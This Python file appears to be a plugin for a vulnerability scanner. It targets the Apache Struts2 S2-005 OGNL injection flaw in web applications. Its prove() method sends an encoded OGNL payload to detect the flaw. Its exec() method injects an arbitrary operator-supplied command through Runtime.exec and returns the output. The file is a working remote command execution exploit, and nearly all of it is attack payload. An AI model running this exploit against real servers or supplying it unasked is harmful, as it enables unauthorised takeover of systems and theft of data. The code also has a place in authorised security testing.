#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript

class Script(BaseScript):

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEB

    async def prove(self):
        if self.base_url:
            async with ClientSession() as session:
                headers = {'Content-Type': 'application/x-www-form-urlencoded'}
                prove_poc = """(%27%5C43_memberAccess.allowStaticMethodAccess%27)(a)=true&(b)((%27%5C43context%5B%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27%5D%5C75false%27)(b))&(%27%5C43c%27)((%27%5C43_memberAccess.excludeProperties%5C75@java.util.Collections@EMPTY_SET%27)(c))&(g)((%27%5C43req%5C75@org.apache.struts2.ServletActionContext@getRequest()%27)(d))&(i2)((%27%5C43xman%5C75@org.apache.struts2.ServletActionContext@getResponse()%27)(d))&(i2)((%27%5C43xman%5C75@org.apache.struts2.ServletActionContext@getResponse()%27)(d))&(i95)((%27%5C43xman.getWriter().println(%22struts2%22%2b%22005_vul%22)%27)(d))&(i99)((%27%5C43xman.getWriter().close()%27)(d))"""
                poc_key = '''struts2005_vul'''
                async with session.post(url=self.url, data=prove_poc, headers=headers) as res:
                    if res :
                        text = await res.text()
                        if text.find(poc_key) != -1:
                            yield self.url

    async def exec(self):
        if self.base_url:
            cmd = self.parameter['cmd']
            async with ClientSession() as session:
                headers = {'Content-Type': 'application/x-www-form-urlencoded'}
                prove_poc = """('%5C43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('%5C43context%5B%5C'xwork.MethodAccessor.denyMethodExecution%5C'%5D%5C75false')(b))&('%5C43c')(('%5C43_memberAccess.excludeProperties%5C75@java.util.Collections@EMPTY_SET')(c))&(g)((%27%5C43req%5C75@org.apache.struts2.ServletActionContext@getRequest()%27)(d))&(g)(('%5C43mycmd%5C75%22%COMMAND%%22')(g))&(h)(('%5C43myret%5C75@java.lang.Runtime@getRuntime().exec(%5C43mycmd)')(d))&(i)(('%5C43mydat%5C75new%5C40java.io.DataInputStream(%5C43myret.getInputStream())')(d))&(j)(('%5C43myres%5C75new%5C40byte%5B51020%5D')(d))&(k)(('%5C43mydat.readFully(%5C43myres)')(d))&(l)(('%5C43mystr%5C75new%5C40java.lang.String(%5C43myres)')(d))&(m)(('%5C43myout%5C75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(n)(('%5C43myout.getWriter().println(%5C43mystr)')(d))""".replace("%COMMAND%",cmd)
                async with session.post(url=self.url, data=prove_poc, headers=headers) as res:
                    if res :
                        text = await res.read()
                        text = text.replace(b'\x00', b'').decode().rstrip('\n')
                        yield text
